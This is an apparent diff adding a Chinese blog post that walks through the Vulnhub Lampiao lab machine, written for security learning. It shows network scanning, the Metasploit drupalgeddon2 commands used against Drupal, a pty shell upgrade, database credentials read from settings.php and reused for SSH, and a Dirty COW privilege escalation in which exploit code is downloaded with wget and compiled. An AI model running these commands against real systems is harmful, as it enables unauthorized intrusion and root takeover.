+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>靶机难度不大</p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
+<li><p><strong>IP 端口</strong> </p>
+<p><code>netdiscover -r 192.168.64.0/24</code></p>
+</li>
+</ul>
+<p><img src="//songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cip.png" alt="1"></p>
+<p>​    <code>namp -A -oN nmap.txt 192.168.64.146</code></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PORT</span>   <span class="selector-tag">STATE</span> <span class="selector-tag">SERVICE</span> <span class="selector-tag">VERSION</span></span><br><span class="line"><span class="selector-tag">22</span>/<span class="selector-tag">tcp</span> <span class="selector-tag">open</span>  <span class="selector-tag">ssh</span>     <span class="selector-tag">OpenSSH</span> <span class="selector-tag">6</span><span class="selector-class">.6</span><span class="selector-class">.1p1</span> <span class="selector-tag">Ubuntu</span> <span class="selector-tag">2ubuntu2</span><span class="selector-class">.7</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="selector-tag">ssh-hostkey</span>: </span><br><span class="line">|   <span class="selector-tag">1024</span> <span class="selector-tag">46</span><span class="selector-pseudo">:b1</span><span class="selector-pseudo">:99</span><span class="selector-pseudo">:60</span><span class="selector-pseudo">:7d</span><span class="selector-pseudo">:81</span><span class="selector-pseudo">:69</span><span class="selector-pseudo">:3c</span><span class="selector-pseudo">:ae</span><span class="selector-pseudo">:1f</span><span class="selector-pseudo">:c7</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:c3</span><span class="selector-pseudo">:66</span><span class="selector-pseudo">:e3</span><span class="selector-pseudo">:10</span> (DSA)</span><br><span class="line">|   <span class="selector-tag">2048</span> <span class="selector-tag">f3</span><span class="selector-pseudo">:e8</span><span class="selector-pseudo">:88</span><span class="selector-pseudo">:f2</span><span class="selector-pseudo">:2d</span><span class="selector-pseudo">:d0</span><span class="selector-pseudo">:b2</span><span class="selector-pseudo">:54</span><span class="selector-pseudo">:0b</span><span class="selector-pseudo">:9c</span><span class="selector-pseudo">:ad</span><span class="selector-pseudo">:61</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:59</span><span class="selector-pseudo">:55</span><span class="selector-pseudo">:93</span> (RSA)</span><br><span class="line">|   <span class="selector-tag">256</span> <span class="selector-tag">ce</span><span class="selector-pseudo">:63</span><span class="selector-pseudo">:2a</span><span class="selector-pseudo">:f7</span><span class="selector-pseudo">:53</span><span class="selector-pseudo">:6e</span><span class="selector-pseudo">:46</span><span class="selector-pseudo">:e2</span><span class="selector-pseudo">:ae</span><span class="selector-pseudo">:81</span><span class="selector-pseudo">:e3</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:b7</span><span class="selector-pseudo">:16</span><span class="selector-pseudo">:f4</span><span class="selector-pseudo">:52</span> (ECDSA)</span><br><span class="line">|<span class="selector-tag">_</span>  <span class="selector-tag">256</span> <span class="selector-tag">c6</span><span class="selector-pseudo">:55</span><span class="selector-pseudo">:ca</span><span class="selector-pseudo">:07</span><span class="selector-pseudo">:37</span><span class="selector-pseudo">:65</span><span class="selector-pseudo">:e3</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:c1</span><span class="selector-pseudo">:d6</span><span class="selector-pseudo">:5b</span><span class="selector-pseudo">:77</span><span class="selector-pseudo">:dc</span><span class="selector-pseudo">:23</span><span class="selector-pseudo">:df</span><span class="selector-pseudo">:cc</span> (EdDSA)</span><br><span class="line"><span class="selector-tag">80</span>/<span class="selector-tag">tcp</span> <span class="selector-tag">open</span>  <span class="selector-tag">http</span>?</span><br><span class="line"><span class="selector-tag">MAC</span> <span class="selector-tag">Address</span>: <span class="selector-tag">00</span><span class="selector-pseudo">:0C</span><span class="selector-pseudo">:29</span><span class="selector-pseudo">:70</span><span class="selector-pseudo">:1E</span><span class="selector-pseudo">:63</span> (VMware)</span><br><span class="line"><span class="selector-tag">Device</span> <span class="selector-tag">type</span>: <span class="selector-tag">general</span> <span class="selector-tag">purpose</span></span><br><span class="line"><span class="selector-tag">Running</span>: <span class="selector-tag">Linux</span> <span class="selector-tag">3</span><span class="selector-class">.X</span>|<span class="selector-tag">4</span><span class="selector-class">.X</span></span><br><span class="line"><span class="selector-tag">OS</span> <span class="selector-tag">CPE</span>: <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span><span class="selector-pseudo">:3</span> <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span><span class="selector-pseudo">:4</span></span><br><span class="line"><span class="selector-tag">OS</span> <span class="selector-tag">details</span>: <span class="selector-tag">Linux</span> <span class="selector-tag">3</span><span class="selector-class">.2</span> <span class="selector-tag">-</span> <span class="selector-tag">4</span><span class="selector-class">.8</span></span><br><span class="line"><span class="selector-tag">Network</span> <span class="selector-tag">Distance</span>: <span class="selector-tag">1</span> <span class="selector-tag">hop</span></span><br><span class="line"><span class="selector-tag">Service</span> <span class="selector-tag">Info</span>: <span class="selector-tag">OS</span>: <span class="selector-tag">Linux</span>; <span class="selector-tag">CPE</span>: <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p>访问80端口发现一个静态页面，且没有任何提示；怀疑开放了其他端口：</p>
+<p><code>nmap -sS -p 1-2000 192.168.64.146</code></p>
+<blockquote>
+<p>-sS    TCP SYN扫描</p>
+</blockquote>
+<p><img src="//songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cport1.png" alt="2"></p>
+<p>访问<code>192.168.64.146:1898</code></p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/web1.png" width="700">
+
+<ul>
+<li><p><strong>web指纹</strong></p>
+<p><code>whatweb http://192.168.64.146:1898</code></p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/web指纹.png" width="800">
+
+</li>
+</ul>
+<p>根据网页下方版权亦可看出，站点CMS为<strong>Drupal</strong></p>
+<ul>
+<li><strong>web目录</strong></li>
+</ul>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/目录.png" width="700">
+
+<h4 id="获取会话"><a href="#获取会话" class="headerlink" title="获取会话"></a>获取会话</h4><p>（1）<strong>metasploit</strong></p>
+<p><code>search Drupal</code></p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/msf_search.png" width="700">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">options</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/10/Lampiao/msf_options.png" width="700">
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> php_func system</span><br><span class="line"><span class="builtin-name">set</span> RHOSTS 192.168.64.146</span><br><span class="line"><span class="builtin-name">set</span> rport 1898</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/10/Lampiao/msf_meter.png" width="700">
+
+<h4 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h4><blockquote>
+<p>msf的shell不是完整的shell，交互不完整；</p>
+<p>恰好此处安装了python，可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生虚拟终端</p>
+</blockquote>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="bash"></span></span><br><span class="line"><span class="bash">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>首先获取系统信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:~/html$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@lampiao:~/html$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line">www-data@lampiao:~/html$ cat /proc/version</span><br><span class="line">cat /proc/version</span><br><span class="line">Linux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016</span><br></pre></td></tr></table></figure>
+
+<p>其次审计web源码，是否能从中获取一些有用信息</p>
+<p>打包web源码:<code>tar -czvf web.tar.gz ../html</code></p>
+<blockquote>
+<p>Linux tar命令用于备份文件。</p>
+<p>tar是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。</p>
+<p>-c    新建打包文件，同 -v 一起使用 查看过程中打包文件名<br>-z    通过gzip方式压缩或解压，最后以.tar.gz 为后缀<br>-v    压缩或解压过程中，显示出来过程<br>-f    后面接要处理的文件<br>-x    解决文件， -C 解压到对应的文件目录<br>-t    列出备份文件的内容。</p>
+<p>##########################################################################</p>
+<p>压缩：tar -czvf web.tar.gz ../html</p>
+<p>解压：tar -xzvf web.tar.gz </p>
+<p>列出压缩文件内容：tar -tzvf test.tar.gz </p>
+</blockquote>
+<p><strong>WEB源码目录</strong>：</p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/源码目录.png" width="700">
+
+<p>其中有用的信息:</p>
+<ol>
+<li>qrc.png =&gt;二维码 （加油信息）</li>
+<li>audio.m4a =&gt;音频信息 （user:tiago）</li>
+<li>/sites/default/settings.php =&gt;web配置文件</li>
+</ol>
+<p>其中settins.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupal'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'drupaluser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'Virgulino'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>此处使用该账号信息进入到mysql，从user表中获取到Linux的账号信息</p>
+<p><img src="//songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cmysql_user.png" alt="9"></p>
+<p>ps：此处应该可以尝试暴力破解，但加了salt很难破解，需要通过工具字典爆。</p>
+<p>但通过网络教程来看，用户tiago的密码恰好为Virgulino，通过ssh登录成功。</p>
+<p>通过脏牛提权</p>
+<blockquote>
+<p>CVE-2016-5195</p>
+<p>脏牛（Dirty COW）</p>
+<p>Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
+</blockquote>
+<p><code>wget https://www.exploit-db.com/download/40847</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv 40847 40847.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/10/Lampiao/dirtycow.png" width="700">
+
+<p>至此提权成功，获取到flag~</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>记录下渗透过程传输文件的技巧</p>
+<p><strong>Linux系统之间传递文件:scp</strong></p>
+<blockquote>
+<p><em>scp</em>是linux系统下基于ssh登陆进行安全的远程文件拷贝命令，因此需要开启ssh服务</p>
+</blockquote>
+<ol>
+<li><p><strong>从本地传送到远程服务器</strong></p>
+<p><strong>1.1传递文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp local_file remote_username@remote_ip:remote_folder #不改变文件名</span><br><span class="line">scp local_file remote_username@remote_ip:remote_file #改变文件名</span><br></pre></td></tr></table></figure>
+
+<p>例:<code>scp /root/Desktop/Lampiao/ test.php xm@192.168.64.128:/home/xm/桌面/test.php</code></p>
+<p><strong>1.2传递文件夹</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r local_folder remote_username@remote_ip:remote_folder</span><br></pre></td></tr></table></figure>
+
+<p>例:<code>scp -r /root/Desktop/Lampiao/  xm@192.168.64.128:/home/xm/桌面/</code></p>
+</li>
+<li><p><strong>从远程服务器传送到本地</strong></p>
+<p>顺序同上面相反</p>
+<p>例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 </span><br><span class="line">scp -r www.runoob.com:/home/root/others/ /home/space/music/</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><strong>wget</strong></p>
+<p>在攻击方服务器上开启web服务，将需要的文件放入web目录下，在靶机上相应目录wget下载下来即可。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
+<li><a href="https://www.runoob.com/linux/linux-comm-tar.html" target="_blank" rel="noopener">Linux tar命令</a></li>
+<li><a href="https://www.runoob.com/linux/linux-comm-scp.html" target="_blank" rel="noopener">Linux scp命令</a></li>
+<li><a href="https://xz.aliyun.com/t/2552" target="_blank" rel="noopener">vulnhub|渗透测试lampiao</a></li>
+<li><a href="https://www.anquanke.com/post/id/84772" target="_blank" rel="noopener">【漏洞预警】CVE-2016-5195 脏牛漏洞：Linux内核通杀提权漏洞（10.27 10:30更新）</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -954,7 +1569,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-count">4</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1052,7 +1667,7 @@
     
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">8k</span>
+    <span title="站点总字数">19k</span>
   
 
   
@@ -1063,7 +1678,7 @@
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">7 分钟</span>
+    <span title="站点阅读时长">17 分钟</span>
   
 </div>
 
